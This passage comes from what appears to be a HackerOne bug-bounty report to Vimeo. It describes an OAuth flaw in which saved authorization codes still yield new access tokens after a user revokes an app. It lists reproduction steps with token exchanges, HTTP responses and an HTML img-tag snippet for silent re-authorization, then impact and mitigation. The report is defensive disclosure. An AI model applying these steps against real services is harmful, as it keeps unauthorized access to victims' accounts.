example:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n```\r\n`code` value is `e1fa87cd449ae55b74445b31ac79450c14eeb657`\r\n4) Use `code` value to obtain `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n{\r\n    \"access_token\": \"d3ac3bb53d1c4ebc3de7d28e4ed801c0\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n<... CUT OUT ... >\r\n}\r\n```\r\n5) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:10:29 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:10:29 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1239-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429625429.334602,VS0,VE203\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n< ... CUT OUT ... >\r\n}\r\n```\r\n6) Repeat step 1. Link for my test application:\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\r\n```\r\n7) Repeat step 2. Log into your accounts (if needed) and click **Allow**.\r\n*Note:* it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.\r\n\r\n*Note 2:* often OAuth providers allow to use `approval_prompt=auto` parameter, which makes this step does not require user to click **Allow** again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:\r\n```\r\n<html>\r\n\t<img src=\"https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\">\r\n</html>\r\n```\r\n\r\nsuch code will \"silently\" produce new `access_token` value to callback each time it has been loaded by the user.\r\n\r\n8) Copy `code` value from callback url and save it for future usage:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9\r\n```\r\n`code` value is `82e24f835184f47cd83f249907e7bd5018bf62c9`\r\n\r\n9) Go to account security settings [https://vimeo.com/settings/apps](https://vimeo.com/settings/apps)\r\n\r\n10) **Disconnect** the application (**Dor1s Test1** if my test application used) from **Apps** section\r\n\r\n11) To ensure that access is denied, repeat step 5:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 401 Authorization Required\r\nDate: Tue, 21 Apr 2015 14:23:55 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.error+json\r\nCache-Control: no-cache, max-age=315360000\r\nWWW-Authenticate: Bearer error=\"invalid_token\"\r\nExpires: Fri, 18 Apr 2025 14:23:55 GMT\r\nContent-Length: 53\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nX-Served-By: cache-fra1245-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626235.146346,VS0,VE105\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"error\": \"A valid user token must be passed.\"\r\n}\r\n```\r\n12) Use `code` value from step 8 and exchange it for `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9\r\n{\r\n    \"access_token\": \"9eabdc746910ea39c07395ee1b69a2b9\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n<... CUT OUT ...>\r\n}\r\n```\r\n13) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:25:41 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:25:41 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1235-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626341.087757,VS0,VE201\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n<... CUT OUT ...>\r\n}\r\n```\r\n\r\nImpact\r\n======\r\nThe vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.\r\n\r\nMitigation\r\n========\r\nFor access revocation processing all authorization `code` issued for certain pair of user and application should be invalidated (as it currently being done for `access_token` values).", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://vimeo.com", 
            "about": "Make life worth watching", 
            "twitter_handle": "vimeo", 
            "name": "Vimeo"
        }, 
        "handle": "vimeo", 
        "url": "https://hackerone.com/vimeo", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/056/28a1c2f9f94f142a175c4a2370dad85a194797e3_small.png?1393009870", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/056/5cb7c3ee4ca70b64963e311c6f5cd8fb4a1daed9_medium.png?1393009870"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 56, 
        "default_currency": "usd"
    }, 
    "is_published": false
}